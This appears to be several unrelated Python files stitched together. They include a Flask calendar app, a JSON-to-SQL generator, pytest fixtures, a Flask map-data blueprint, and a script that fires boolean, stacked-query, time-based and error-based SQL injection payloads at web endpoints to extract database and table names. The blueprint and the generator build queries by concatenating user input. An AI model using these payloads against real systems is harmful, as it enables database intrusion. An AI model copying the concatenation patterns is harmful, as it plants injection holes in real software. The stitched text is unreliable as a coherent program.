  id = request.args.get('calendar')
  if id is None:
    return "Must provide a calendar id"
  username, password = getUsernameAndPassword()

  if request.method == 'GET':
    calendarDetails = calendar.getCalendarDetails(id, mysql)
    availabilityDetails = calendar.getAvailabilityForCalendar(id, mysql)
    hours = {
      "Morning Hours": [1, 2, 3,4, 5, 6, 7, 8, 9, 10, 11, 12],
      "Evening Hours": [13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24]
    }
    if calendarDetails is None:
      return "No calendar exists with that ID"
    else:
      return render_template('view-calendar.html', hours=hours, availabilityDetails=availabilityDetails, calendarId=id, calendarDetails=calendarDetails)

@app.route('/availability', methods=['GET','POST'])
def availability():

  isAuthorized = isUserAuthorized()
  if not isAuthorized:
    return "Unauthorized"

  username, password = getUsernameAndPassword()

  if request.method == 'POST':
    calendarId = request.form['calendarId']
    #update the calendar with user availability
    res = calendar.updateAvailability(username, calendarId, mysql, request.form)

    if res:
      return render_template('calendar/availability/success.html')
    else:
      return render_template('calendar/availability/error.html')
  else:
    calendarId = request.args.get('calendarId')
    #get user's current availability and display that
    res = calendar.getAvailability(username, calendarId, mysql)
    if res is not None:
      return render_template('calendar/availability/availability.html',
        calendarId=calendarId, check0=res[0],   check1=res[1],
        check2=res[2],     check3=res[3],     check4=res[4],   check5=res[5],   check6=res[6],
        check7=res[7],     check8=res[8],     check9=res[9],   check10=res[10], check11=res[11],
        check12=res[12],   check13=res[13],   check14=res[14], check15=res[15], check16=res[16],
        check17=res[17],   check18=res[18],   check19=res[19], check20=res[20], check21=res[21],
        check22=res[22],   check23=res[23])

    return render_template('calendar/availability/error.html')

if __name__ =='__main__':
  app.run()

import datetime
import json
import logging
import re

import MySQLdb

from collections import namedtuple, defaultdict

logger = logging.getLogger(u'JSON2SQLGenerator')


class JSON2SQLGenerator(object):
    """
    To Generate SQL query from JSON data
    """

    # Constants to map JSON keys
    WHERE_CONDITION = 'where'
    AND_CONDITION = 'and'
    OR_CONDITION = 'or'
    NOT_CONDITION = 'not'
    EXISTS_CONDITION = 'exists'
    CUSTOM_METHOD_CONDITION = 'custom_method'

    # Supported data types by plugin
    INTEGER = 'integer'
    STRING = 'string'
    DATE = 'date'
    DATE_TIME = 'datetime'
    BOOLEAN = 'boolean'
    NULLBOOLEAN = 'nullboolean'
    CHOICE = 'choice'
    MULTICHOICE = 'multichoice'

    CONVERSION_REQUIRED = [
        STRING, DATE, DATE_TIME
    ]

    # Maintain a set of binary operators
    BETWEEN = 'between'
    BINARY_OPERATORS = (BETWEEN, )

    # MySQL aggregate functions
    ALLOWED_AGGREGATE_FUNCTIONS = {'MIN', 'MAX'}

    # Custom methods field types
    ALLOWED_CUSTOM_METHOD_PARAM_TYPES = {'field', 'integer', 'string'}

    # Is operator values
    IS_OPERATOR_VALUE = {'NULL', 'NOT NULL', 'TRUE', 'FALSE'}

    # Supported operators
    VALUE_OPERATORS = namedtuple('VALUE_OPRATORS', [
        'equals', 'greater_than', 'less_than',
        'greater_than_equals', 'less_than_equals',
        'not_equals', 'is_op', 'in_op', 'like', 'between',
        'is_challenge_completed', 'is_challenge_not_completed'
    ])(
        equals='=',
        greater_than='>',
        less_than='<',
        greater_than_equals='>=',
        less_than_equals='<=',
        not_equals='<>',
        is_op='IS',
        in_op='IN',
        like='LIKE',
        is_challenge_completed='is_challenge_completed',
        is_challenge_not_completed='is_challenge_not_completed',
        between=BETWEEN
    )

    DATA_TYPES = namedtuple('DATA_TYPES', [
        'integer', 'string', 'date', 'date_time', 'boolean', 'nullboolean',
        'choice', 'multichoice'
    ])(
        integer=INTEGER,
        string=STRING,
        date=DATE,
        date_time=DATE_TIME,
        boolean=BOOLEAN,
        nullboolean=NULLBOOLEAN,
        choice=CHOICE,
        multichoice=MULTICHOICE
    )

    # Constants
    FIELD_NAME = 'field_name'
    TABLE_NAME = 'table_name'
    DATA_TYPE = 'data_type'

    JOIN_TABLE = 'join_table'
    JOIN_COLUMN = 'join_column'
    PARENT_TABLE = 'parent_table'
    PARENT_COLUMN = 'parent_column'

    CHALLENGE_CHECK_QUERY = 'EXISTS (SELECT 1 FROM journeys_memberstagechallenge WHERE challenge_id = {value} AND ' \
                            'completed_date IS NOT NULL AND member_id = patients_member.id) '

    # - Used in custom method mapping -
    TEMPLATE_STR_KEY = 'template_str'
    TEMPLATE_PARAMS_KEY = 'parameters'
    TEMPLATE_KEY_REGEX = r"{(\w+)}"

    def __init__(self, field_mapping, paths, custom_methods):
        """
        Initialise basic params.
        :type custom_methods: (tuple) tuple of tuples containing (id, sql_template, variables)
        :param field_mapping: (tuple) tuple of tuples containing (field_identifier, field_name, table_name).
        :param paths: (tuple) tuple of tuples containing (join_table, join_field, parent_table, parent_field).
                      Information about paths from a model to reach to a specific model and when to stop.
        :return: None
        """

        self.base_table = ''
        self.field_mapping = self._parse_field_mapping(field_mapping)
        self.path_mapping = self._parse_multi_path_mapping(paths)
        self.custom_methods = self._parse_custom_methods(custom_methods)

        # Mapping to be used to parse various combination keywords data
        self.WHERE_CONDITION_MAPPING = {
            self.WHERE_CONDITION: '_generate_where_phrase',
            self.AND_CONDITION: '_parse_and',
            self.OR_CONDITION: '_parse_or',
            self.NOT_CONDITION: '_parse_not',
            self.EXISTS_CONDITION: '_parse_exists',
            self.CUSTOM_METHOD_CONDITION: '_parse_custom_method_condition',
        }

    def _parse_custom_methods(self, sql_templates):
        """
        Validate the template data and pre process the data.

        :param sql_templates: (tuple) tuple of tuples containing (id, sql_template, variables)
        :return:
        """
        template_mapping = {}

        for template_id, template_str, parameters in sql_templates:
            template_id = int(template_id)
            parameters = json.loads(parameters)
            template_str = template_str.strip()

            assert len(template_str) > 0, 'Not a valid template string'
            assert template_id not in template_mapping, 'Template id must be unique'
            template_defined_variables = set(re.findall(self.TEMPLATE_KEY_REGEX, template_str, re.MULTILINE))
            # Checks if variable defined in template string and variables declared are exactly same
            assert len(set(parameters.keys()) ^ template_defined_variables) == 0, 'Extra variable defined'
            # Checks parameter types are permitted
            assert len(set(map(lambda l: l['data_type'], parameters.values()))
                       - self.ALLOWED_CUSTOM_METHOD_PARAM_TYPES) == 0, 'Invalid data type defined'

            template_mapping[template_id] = {
                self.TEMPLATE_STR_KEY: template_str,
                self.TEMPLATE_PARAMS_KEY: parameters
            }

        return template_mapping

    def _parse_custom_method_condition(self, data):
        """
        Process the custom method condition to render SQL template using the arguments given.
        
        :param data:
        :return:
        """
        assert isinstance(data, dict), 'Input data must be a dict'
        assert 'template_id' in data, 'No template_id is provided'
        template_id = int(data['template_id'])
        template_data = self.custom_methods[template_id]

        # Process parameters
        validated_parameters = {}
        for param_id, param_data in data.get('parameters', {}).items():
            assert param_id in template_data[self.TEMPLATE_PARAMS_KEY], 'Invalid parameter name.'
            param_type = template_data[self.TEMPLATE_PARAMS_KEY][param_id]['data_type']

            validated_parameters[param_id] = self._process_parameter(param_type, param_data)

        # Check that we have collected all the required keys
        template_params = template_data[self.TEMPLATE_PARAMS_KEY].keys()
        assert len(set(template_params) ^ set(validated_parameters.keys())) == 0, \
            'Missing or extra template variable'

        return template_data[self.TEMPLATE_STR_KEY].format(**validated_parameters)

    def _process_parameter(self, data_type, parameter_data):
        assert len(data_type) > 0, 'Invalid data type'
        assert isinstance(parameter_data, dict), 'Invalid parameter data format'

        if data_type.upper() == 'FIELD':
            field_data = self.field_mapping[parameter_data['field']]
            return "`{table}`.`{field}`".format(
                table=field_data[self.TABLE_NAME], field=field_data[self.FIELD_NAME]
            )
        elif data_type.upper() == 'INTEGER':
            return int(parameter_data['value'])
        elif data_type.upper() == 'STRING':
            return parameter_data['value']                    
        else:
            raise AttributeError("Unsupported data type for parameter: {}".format(data_type))

    def generate_sql(self, data, base_table):
        """
        Create SQL query from provided json
        :param data: (dict) Actual JSON containing nested condition data.
                     Must contain two keys - fields(contains list of fields involved in SQL) and where_data(JSON data)
        :param base_table: (string) Exact table name as in DB to be used with FROM clause in SQL.
        :return: (unicode) Finalized SQL query unicode
        """
        self.base_table = base_table
        assert self.validate_where_data(data.get('where_data', {})), 'Invalid where data'
        where_phrase = self._generate_sql_condition(data['where_data'])

        if 'group_by_fields' in data:
            assert isinstance(data['group_by_fields'], list), 'Group by fields need to list of dict'
            data['group_by_fields'] = list(map(lambda x: int(x['field']), data['group_by_fields']))

        path_subset = self.extract_paths_subset(list(
            map(lambda field_id: self.field_mapping[field_id][self.TABLE_NAME], data['fields'])),
            data.get('path_hints', {})
        )
        join_tables = self.create_join_path(path_subset, self.base_table)
        join_phrase = self.generate_left_join(join_tables)
        group_by_phrase = self.generate_group_by(data.get('group_by_fields', []),
                                                 data.get('having', {}))
        count_phrase = u'COUNT(DISTINCT `{base_table}`.`id`)'.format(base_table=base_table)

        return u'SELECT {count_phrase} FROM {base_table} {join_phrase} WHERE {where_phrase} {group_by_fragment}'.format(
            join_phrase=join_phrase,
            base_table=base_table,
            where_phrase=where_phrase,
            group_by_fragment=group_by_phrase,
            count_phrase=count_phrase
        )

    def _parse_multi_path_mapping(self, paths):
        """
        Create mapping of what nodes can be reached from any given node.
        This method also support the case when you can jump to multiple node from any given node

        :param paths: (tuple) tuple of tuples in the format ((join_table, join_field, parent_table, parent_field),)
        :return: (dict) dict in the format {'join_table': {'parent_table': {'parent_field': , 'join_field':} }}
        """
        path_map = defaultdict(dict)
        for join_tbl, join_fld, parent_tbl, parent_fld in paths:
            # We can support if there are multiple ways to join a table
            # We don't support if there are multiple fields on join table path
            assert parent_tbl not in path_map[join_tbl], 'Joins with multiple fields is not supported'
            path_map[join_tbl][parent_tbl] = {
                self.PARENT_COLUMN: parent_fld,
                self.JOIN_COLUMN: join_fld
            }

        return path_map

    def extract_paths_subset(self, start_nodes, path_hints):
        """
        Extract a subset of paths which only contains paths which are possible from starting nodes
        When there is multiple options from any node then we look in path hints to select a node.

        This method also aims to merge duplicate path nodes.
        Example:
        A -> B -> C
        A -> B ->  D

        Merge this into
        A -> B -> C
             | -> D

        Merge happens from left side not right side.
        As our current implementation base is always on left side

        Left side is always base_table
        :param start_nodes: Array of table names
        :param path_hints:
        :return:
        """
        path_subset = defaultdict(set)
        # Convert start nodes to set as we would need this for lookups
        start_nodes = set(start_nodes)
        traversal_nodes = list(start_nodes)  # type: list

        # We would be doing traversal from given tables towards base tables.
        while len(traversal_nodes) > 0:
            curr_node = traversal_nodes.pop()  # type: str

            # This condition indicate that we have reached end of path
            if curr_node == self.base_table:
                continue

            next_nodes = self.path_mapping[curr_node]  # type: dict

            if curr_node in path_hints:
                assert path_hints[curr_node] in next_nodes, 'Node provided in hint is not a valid option.'
                assert len(
                    set(self.path_mapping[curr_node]) &
                    (start_nodes | set(path_hints.values()))
                ) == 1, 'Multiple paths are selected from node {}'.format(curr_node)
                parent_node = path_hints[curr_node]
                traversal_nodes.append(parent_node)
            elif len(next_nodes) == 1:
                parent_node = next_nodes.keys()[0]
                traversal_nodes.append(parent_node)
            else:
                raise Exception("No path hint provided for `{}`".format(curr_node))

            path_subset[parent_node].add(curr_node)

        return path_subset

    def create_join_path(self, path_map, curr_table):
        """
        Convert the path subset into a join table
        Return list of tuples
        [(join table, parent table)]
        :param path_map: (dict) Nested dict of format { join_table: { parent_table: {join_field, parent_field} } }
        :param curr_table: (str) Node from which we need to be created.
        :return:
        """
        # This condition satisfied when we reach the end of the current path
        if curr_table not in path_map:
            return

        for table_name in sorted(path_map[curr_table]):
            yield (table_name, curr_table)
            for item in (self.create_join_path(path_map, table_name)):
                yield item

    def generate_left_join(self, join_path):
        join_phrases = []
        for join_table, parent_table in join_path:
            join_phrases.append(
                'LEFT JOIN {join_tbl} ON {join_tbl}.{join_fld} = {parent_tbl}.{parent_fld}'.format(
                    join_tbl=join_table,
                    parent_tbl=parent_table,
                    join_fld=self.path_mapping[join_table][parent_table][self.JOIN_COLUMN],
                    parent_fld=self.path_mapping[join_table][parent_table][self.PARENT_COLUMN]
                )
            )

        return ' '.join(join_phrases)

    def generate_group_by(self, group_by_fields, having_clause):
        """
        Validate and return group by and having clause statement

        :rtype: str
        :type having_clause: Dict
        :type group_by_fields: List[int]
        """
        assert isinstance(group_by_fields, list)
        assert isinstance(having_clause, dict)

        assert self.validate_group_by_data(group_by_fields, having_clause), 'Invalid having data'

        if len(group_by_fields) == 0:
            return ''

        result = ''
        fully_qualified_field_names = map(
            lambda field_id: '`{table_name}`.`{field_name}`'.format(
                table_name=self.field_mapping[field_id][self.TABLE_NAME],
                field_name=self.field_mapping[field_id][self.FIELD_NAME]
            ),
            group_by_fields
        )

        result += 'GROUP BY {fields}'.format(fields=', '.join(fully_qualified_field_names))
        if len(having_clause.keys()) > 0:
            result += ' HAVING {condition}'.format(condition=self._generate_sql_condition(having_clause))

        return result

    def validate_group_by_data(self, group_by_fields, having):
        """
        Validate the group by data to check if it can produce a query which is valid.
        For example it would check only group by fields or aggregate functions are being used.

        :type having: Dict
        :type group_by_fields: List[int]
        """
        assert isinstance(group_by_fields, list)
        assert isinstance(having, dict)

        for cond in self.extract_key_from_nested_dict(having, self.WHERE_CONDITION):
            assert isinstance(cond, dict), 'where condition needs to be dict'
            assert 'aggregate_lhs' in cond or cond.get('field') in group_by_fields, \
                'Use of non aggregate value or non grouped field: {}'.format(cond)

        return True

    def validate_where_data(self, where_data):
        """
        Validate if where fields doesn't contains use of aggregation function
        :type where_data: Dict
        """
        assert isinstance(where_data, dict) and len(where_data) > 0, \
            'Invalid or empty where data'

        for cond in self.extract_key_from_nested_dict(where_data, self.WHERE_CONDITION):
            assert isinstance(cond, dict), 'Invalid where condition'
            assert cond.get('aggregate_lhs', '') == '', \
                'Use of non aggregate value or non grouped field: {}'.format(cond)

        return True

    def _generate_sql_condition(self, data):
        """
        This function uses recursion to generate sql for nested conditions.
        Every key in the dict will map to a function by referencing WHERE_CONDITION_MAPPING.
        The function mapped to that key will be responsible for generating SQL for that part of the data.
        :param data: (dict) Conditions data which needs to be parsed to generate SQL
        :return: (unicode) Unicode representation of data into SQL
        """
        result = ''
        # Check if data is not blank
        if data:
            # Get the first key in dict.
            condition = data.keys()[0]
            # Call the function mapped to the condition
            function = getattr(self, self.WHERE_CONDITION_MAPPING.get(condition))
            result = function(data[condition])
        return result

    def _get_validated_data(self, where):
        try:
            operator = where['operator'].lower()
            value = where['value']
            field = where['field']
        except KeyError as e:
            raise KeyError(
                u'Missing key - [{}] in where condition dict'.format(e.args[0])
            )
        else:
            # Get optional secondary value
            secondary_value = where.get('secondary_value')
            # Check if secondary_value is present for binary operators
            if operator in self.BINARY_OPERATORS and not secondary_value:
                raise ValueError(
                    u'Missing key - [secondary_value] for operator - [{}]'.format(
                        operator
                    )
                )
            return operator, value, field, secondary_value

    def _generate_where_phrase(self, where):
        """
        Function to generate a single condition(column1 = 1, or column1 BETWEEN 1 and 5) based on data provided.
        Uses _join_names to assign table_name to a field in query.
        :param where: (dict) will contain required data to generate condition.
                      Sample Format: {"field": , "primary_value": ,"operator": , "secondary_value"(optional): }
        :return: (unicode) SQL condition in unicode represented by where data
        """
        # Check data valid
        if not isinstance(where, dict):
            raise ValueError(
                'Where condition data must be a dict. Found [{}]'.format(
                    type(where)
                )
            )
        # Get all the data elements required and validate them
        operator, value, field, secondary_value = self._get_validated_data(where)
        # Get db field name
        field_name = self.field_mapping[field][self.FIELD_NAME]
        # Get corresponding SQL operator
        sql_operator = getattr(self.VALUE_OPERATORS, operator)
        # Get data type and table name from field_mapping
        data_type = self._get_data_type(field)
        table = self._get_table_name(field)

        # `value` contains the R.H.S part of the equation.
        # In case of `IS` operator R.H.S can be `NULL` or `NOT NULL`
        # irrespective of data type of the L.H.S.
        # Hence we want to skip data type check for `IS` operator.
        if sql_operator == self.VALUE_OPERATORS.is_op:
            assert value.upper() in self.IS_OPERATOR_VALUE, 'Invalid rhs for `IS` operator'
            sql_value, secondary_sql_value = value.upper(), None
        else:
            # Check if the primary value and data_type are in sync
            self._sanitize_value(value, data_type)
            # Check if the secondary_value and data_type are in sync
            if secondary_value:
                self._sanitize_value(secondary_value, data_type)

            # Make string SQL injection proof
            if data_type == self.STRING:
                value = self._sql_injection_proof(value)
                if secondary_value:
                    secondary_value = self._sql_injection_proof(secondary_value)

            # Make value sql proof. For ex: if value is string or data convert it to '<value>'
            sql_value, secondary_sql_value = self._convert_values(
                [value, secondary_value], data_type
            )

        lhs = u'`{table}`.`{field}`'.format(table=table, field=field_name)  # type: unicode

        # Apply aggregate function to L.H.S
        if 'aggregate_lhs' in where:
            aggregate_func_name = where['aggregate_lhs'].upper()  # type: unicode
            if aggregate_func_name in self.ALLOWED_AGGREGATE_FUNCTIONS:
                lhs = u'{func_name}({field_name})'.format(func_name=aggregate_func_name, field_name=lhs)
            else:
                logger.info("Unsupported aggregate functions: {}".format(aggregate_func_name))

        # TODO: Based on the assumption that below operator will only used
        #           with challenge.
        if sql_operator in [self.VALUE_OPERATORS.is_challenge_completed,
                            self.VALUE_OPERATORS.is_challenge_not_completed]:
            return "{negate} {check}".format(
                negate='NOT' if sql_operator == self.VALUE_OPERATORS.is_challenge_not_completed else '',
                check=self.CHALLENGE_CHECK_QUERY.format(value=sql_value)
            )

        # Generate SQL phrase
        if sql_operator == self.BETWEEN:
            where_phrase = u'{lhs} {operator} {primary_value} AND {secondary_value}'.format(
                lhs=lhs, operator=sql_operator,
                value=sql_value, secondary_value=secondary_sql_value
            )
        else:
            where_phrase = u'{lhs} {operator} {value}'.format(
                operator=sql_operator, lhs=lhs, value=sql_value,
            )
        return where_phrase

    def _get_data_type(self, field):
        """
        Gets data type for the field from self.field_mapping configured in __init__
        :param field: (int|string) field identifier that is used as key in self.field_mapping
        :return: (string) data type of the field
        """
        return self.field_mapping[field][self.DATA_TYPE]

    def _get_table_name(self, field):
        """
        Gets table name for the field from self.field_mapping configured in __init__
        :param field: (int|string) Field identifier that is used as key in self.field_mapping
        :return: (string|unicode) Name of the table of the field
        """
        return self.field_mapping[field][self.TABLE_NAME]

    def _convert_values(self, values, data_type):
        """
        Converts values for SQL query. Adds '' string, date, datetime values, string choice value
        :param values: (iterable) Any instance of iterable values of same data type that need conversion
        :param data_type: (string) Data type of the values provided
        """
        if data_type in [self.CHOICE, self.MULTICHOICE]:
            # try converting the value to int
            try:
                int(values[0])
            except ValueError:
                wrapper = '\'{value}\''
            else:
                wrapper = '{value}'
        elif data_type in self.CONVERSION_REQUIRED:
            wrapper = '\'{value}\''
        else:
            wrapper = '{value}'
        return (wrapper.format(value=value) for value in values)

    def _sanitize_value(self, value, data_type):
        """
        Validate value with data type
        :param value: Values that needs to be validated with data type
        :param data_type: (string) Data type against which the value will be compared
        :return: None
        """
        if data_type == self.INTEGER:
            try:
                int(value)
            except ValueError:
                raise ValueError(
                    'Invalid value -[{}] for data_type - [{}]'.format(
                        value, data_type
                    )
                )
        elif data_type == self.DATE:
            try:
                datetime.datetime.strptime(value, '%Y-%m-%d')
            except ValueError as e:
                raise e
        elif data_type == self.DATE_TIME:
            try:
                datetime.datetime.strptime(value, '%Y-%m-%dT%H:%M:%S')
            except ValueError as e:
                raise e

    def _parse_and(self, data):
        """
        To parse the AND condition for where clause.
        :param data: (list) contains list of data for conditions that need to be ANDed
        :return: (unicode) unicode containing SQL condition represeted by data ANDed. 
                 This SQL can be directly placed in a SQL query
        """
        return self._parse_conditions(self.AND_CONDITION, data)

    def _parse_or(self, data):
        """
        To parse the OR condition for where clause.
        :param data: (list) contains list of data for conditions that need to be ORed
        :return: (unicode) unicode containing SQL condition represeted by data ORed. 
                 This SQL can be directly placed in a SQL query
        """
        return self._parse_conditions(self.OR_CONDITION, data)

    def _parse_exists(self, data):
        """
        To parse the EXISTS check/wrapper for where clause.
        :param data: (list) contains a list of single element of data for conditions that
                            need to be wrapped with a EXISTS check in WHERE clause
        :return: (unicode) unicode containing SQL condition represeted by data with EXISTS check. 
                 This SQL can be directly placed in a SQL query
        """
        raise NotImplementedError

    def _parse_not(self, data):
        """
        To parse the NOT check/wrapper for where clause.
        :param data: (list) contains a list of single element of data for conditions that
                            need to be wrapped with a NOT check in WHERE clause
        :return: (unicode) unicode containing SQL condition represeted by data with NOT check. 
                 This SQL can be directly placed in a SQL query
        """
        return self._parse_conditions(self.NOT_CONDITION, data)

    def _parse_conditions(self, condition, data):
        """
        To parse AND, NOT, OR, EXISTS data and
        delegate to proper functions to generate combinations according to condition provided.
        NOTE: This function doesn't do actual parsing. 
              All it does is deligate to a function that would parse the data.
              The main logic for parsing only resides in _generate_where_phrase
              as every condition is similar, its just how we group them
        :param condition: (string) the condition to use to combine the condition represented by data
        :param data: (list) list conditions to be combined or parsed
        :return: (unicode) unicode string that could be placed in the SQL
        """
        sql = bytearray()
        for element in data:
            # Get the first key in the dict.
            inner_condition = element.keys()[0]
            function = getattr(self, self.WHERE_CONDITION_MAPPING.get(inner_condition))
            # Call the function mapped to it.
            result = function(element.get(inner_condition))
            # Append the result to the sql.
            if not sql and condition in [self.AND_CONDITION, self.OR_CONDITION]:
                sql.extend('({})'.format(result))
            else:
                sql.extend(' {0} ({1})'.format(condition, result))
        return u'({})'.format(sql.decode('utf8'))

    def _parse_field_mapping(self, field_mapping):
        """
        Converts tuple of tuples to dict.
        :param field_mapping: (tuple) tuple of tuples in the format ((field_identifier, field_name, table_name, data_type),)
        :return: (dict) dict in the format {'<field_identifier>': {'field_name': <>, 'table_name': <>, 'data_type': <>,}}
        """
        return {
            field[0]: {
               self.FIELD_NAME: field[1],
               self.TABLE_NAME: field[2],
               self.DATA_TYPE: field[3]
            } for field in field_mapping
        }

    def _sql_injection_proof(self, value):
        """
        Escapes strings to avoid SQL injection attacks
        :param value: (string|unicode) string that needs to be escaped
        :return: (string|unicode) escaped string
        """
        return MySQLdb.escape_string(value)

    def extract_key_from_nested_dict(self, target_dict, key):
        """
        Traverse the dictionary recursively and return the value with specified key

        :type target_dict: Dict
        :type key: str
        """
        assert isinstance(target_dict, dict)
        assert isinstance(key, str) and key

        for k, v in target_dict.items():
            if k == key:
                yield v
            elif isinstance(v, dict):
                for item in self.extract_key_from_nested_dict(v):
                    yield item

import urllib.parse as urlparse

import pytest
import sqlalchemy as sa

from pymash import cfg
from pymash import main
from pymash import tables


@pytest.fixture(scope='session')
def _system_engine(request):
    return _get_engine(request, 'postgres')


@pytest.fixture(scope='session')
def _pymash_engine(request):
    return _get_engine(request)


def _get_engine(request, database=None):
    config = cfg.get_config()
    if database is not None:
        dsn = _replace_dsn_database(config.dsn, database)                    
    else:
        dsn = config.dsn
    engine = sa.create_engine(dsn)
    request.addfinalizer(engine.dispose)
    return engine


def _replace_dsn_database(dsn, new_database):                    
    parsed = urlparse.urlparse(dsn)
    replaced = parsed._replace(path=new_database)
    return replaced.geturl()


@pytest.fixture(scope='session', autouse=True)
def _create_database(request, _system_engine):
    test_db_name = _get_test_db_name()
    # TODO(aershov182): use sqlalchemy for query generation
    with _system_engine.connect().execution_options(                    
            isolation_level="AUTOCOMMIT") as conn:                    
        conn.execute(f'DROP DATABASE IF EXISTS {test_db_name}')                    
        conn.execute(f'CREATE DATABASE {test_db_name}')                    
    create_tables()
    request.addfinalizer(lambda: _drop_database(_system_engine))


def _drop_database(system_engine):
    # TODO(aershov182): remove duplication with _create_database
    test_db_name = _get_test_db_name()
    # TODO(aershov182): use sqlalchemy for query generation
    with system_engine.connect().execution_options(
            isolation_level="AUTOCOMMIT") as conn:                    
        conn.execute(f'DROP DATABASE {test_db_name}')


def _get_test_db_name():
    config = cfg.get_config()
    return urlparse.urlparse(config.dsn).path.lstrip('/')


async def test_show_game(test_client):
    text = await _get(test_client, '/game')
    assert text == 'hello!'


async def test_show_leaders(test_client):
    text = await _get(test_client, '/leaders')
    assert text == '0'


async def _get(test_client, path):
    app = main.create_app()
    # TODO(aershov182): adding to on_startup should be more visible
    app.on_startup.append(_clean_tables)
    client = await test_client(app)
    resp = await client.get(path)
    text = await resp.text()
    return text


def create_tables():
    config = cfg.get_config()
    engine = sa.create_engine(config.dsn)
    tables.Base.metadata.create_all(engine)
    # TODO(aershov182): maybe use context manager to dispose
    engine.dispose()


async def _clean_tables(app):
    async with app['db_engine'].acquire() as conn:
        for sa_model in tables.Base.__subclasses__():
            table = sa_model.__table__
            conn.execute(table.delete())

# -- coding: utf-8 --
import os
import sys
import urllib2
import httplib
import json as js
# from datetime import datetime
import time
import requests


def check_boolean_based_attack(url):
    arr = ["'%20OR%20'1'%20=%20'1';%20--%20", "\"%20OR%20'1'%20=%20'1';%20--%20", "%20OR%20'1'%20=%20'1';%20--%20"]
    for e in arr:                    
        opener = urllib2.build_opener()                    
        f = opener.open(url + e)                    
        if f.getcode() == 200:
            res = js.loads(f.read())
            print "This web server is vulnerable for boolean based attack."                    
            print "The response after boolean attack is:"
            print res
            print
            break


def check_stack_query(url):
    req = url + "'%3B%20SELECT%20DATABASE()%3B%20--%20"
    opener = urllib2.build_opener()                    
    f = opener.open(req)
    database = js.loads(f.read())
    print "This web server is vulnerable for Stacked Queries(Piggy Backing)."                    
    print "The Database's name is: "
    print database[1][0]['DATABASE()'] + "\n"

    req = url + "'%3B%20SHOW%20TABLES%3B%20--%20"
    f = opener.open(req)
    tables = js.loads(f.read())
    print "The tables in this database are: "
    for table in tables[1]:
        print table.values()[0]
    print


def check_time_based_attack(url):                    
    arr = ["'%20AND%20SLEEP(15);%20--%20", "\"%20AND%20SLEEP(15);%20--%20", "%20AND%20SLEEP(15);%20--%20"]                    
    for e in arr:                    
        a = time.time()                    
        opener = urllib2.build_opener()                    
        f = opener.open(url + e)                    
        b = time.time()                    
        duration = b - a                    
        if duration > 13:                    
            print "This web server is vulnerable for time based attack."                    
            print "The response time after boolean attack SLEEP(15) is: " + str(duration) + "\n"                    


def check__error_based_attack(url):
    for i in range(1, 1000):
        newUrl = url + "'%20ORDER%20BY%20" + str(i) + "%3B--%20"
        r = requests.get(newUrl)
        # print r.content
        # print r.status_code
        # print r.content.find("ER_BAD_FIELD_ERROR") != -1
        if r.status_code != 200 and r.content.find("ER_BAD_FIELD_ERROR") != -1:
            print "This web server is potentially vulnerable for error based attack. " \                    
                  "The suggestion is do not exposed detailed database error to the public."
            print "The error message is:"
            print r.content
            print
            break

online = "https://my-securitytest.herokuapp.com/getFriend/user1"
local = "http://localhost:3000/getFriend/user1"

check_boolean_based_attack(local)                    
check_stack_query(local)                    
check__error_based_attack(local)                    

# check_time_based_attack(local)

# localhost:3000/getFriend/user1'; SELECT DATABASE(); --%20
# localhost:3000/getFriend/user1'; SHOW TABLES; --%20

#
# commands = {
#     'command1': ex1.check_stack_query,
#     'command2': ex1.check_if_database_error_exposed
# }
#
# if __name__ == '__main__':
#     command = os.path.basename(sys.argv[0])
#     if command in commands:
#         commands[command](*sys.argv[1:])

# coding: utf-8
import os
import flask
from werkzeug.wrappers import Response 
import psycopg2
from ..config import config
from .. import utils
from ..database import *
from ..initApp import app
from ..auth import check_auth
import ast


addObs = flask.Blueprint('addObs', __name__,static_url_path="/addObs", static_folder="static", template_folder="templates")

from flask import make_response, session
from functools import wraps, update_wrapper
from datetime import datetime


def nocache(view):
    @wraps(view)
    def no_cache(*args, **kwargs):
        response = make_response(view(*args, **kwargs))
        response.headers['Last-Modified'] = datetime.now()
        response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, post-check=0, pre-check=0, max-age=0'
        response.headers['Pragma'] = 'no-cache'
        response.headers['Expires'] = '-1'
        return response
    return update_wrapper(no_cache, view)

@addObs.route('/')
@check_auth(2)
@nocache
def addObs_index():
    return flask.render_template('addObsIndex.html', configuration=config, page_title=u"Interface de saisie des donn√©es")





@addObs.route('/search_taxon_name/<table>/<expr>', methods=['GET'])
def search_taxon_name(table, expr):
    db=getConnexion()
    sql = """ SELECT array_to_json(array_agg(row_to_json(r))) FROM(
                SELECT cd_ref, search_name, nom_valide from taxonomie.taxons_"""+table+"""
                WHERE search_name ILIKE %s  
                ORDER BY search_name ASC 
                LIMIT 20) r"""
    params = ["%"+expr+"%"]
    db.cur.execute(sql, params)
    res = db.cur.fetchone()[0]
    db.closeAll()
    return Response(flask.json.dumps(res), mimetype='application/json')



@addObs.route('/loadMailles', methods=['GET'])
def getMaille():
    db = getConnexion()
    sql = """ SELECT row_to_json(fc)
              FROM ( SELECT 
                'FeatureCollection' AS type, 
                array_to_json(array_agg(f)) AS features
                FROM(
                    SELECT 'Feature' AS type,
                   ST_ASGeoJSON(ST_TRANSFORM(m.geom,4326))::json As geometry,
                   row_to_json((SELECT l FROM(SELECT id_maille) AS l)) AS properties
                   FROM layers.maille_1_2 AS m WHERE m.taille_maille='1') AS f)
                AS fc; """
    db.cur.execute(sql)                    
    res = db.cur.fetchone()
    db.closeAll()
    return Response(flask.json.dumps(res), mimetype='application/json')

#charge les mailles de la bounding box courante de la carte
@addObs.route('/load_bounding_box_mailles/<limit>', methods=['GET'])
def getboundingMaille(limit):
    db = getConnexion()
    sql = 'SELECT ST_TRANSFORM(ST_MakeEnvelope('+limit+', 4326),32620);'                    
    db.cur.execute(sql)                    
    bounding = db.cur.fetchone()                    
    sql = """ SELECT row_to_json(fc)
              FROM ( SELECT 
                'FeatureCollection' AS type, 
                array_to_json(array_agg(f)) AS features
                FROM(
                    SELECT 'Feature' AS type,
                   ST_ASGeoJSON(ST_TRANSFORM(m.geom,4326))::json As geometry,
                   row_to_json((SELECT l FROM(SELECT id_maille) AS l)) AS properties
                   FROM layers.maille_1_2 AS m WHERE m.taille_maille='1' AND ST_Within(m.geom,ST_TRANSFORM(ST_MakeEnvelope("""+limit+""", 4326),32620))  ) AS f)                    
                AS fc; """
    db.cur.execute(sql)                    
    res = db.cur.fetchone()
    db.closeAll()
    return Response(flask.json.dumps(res), mimetype='application/json')


@addObs.route('/loadProtocoles', methods=['GET', 'POST'])                    
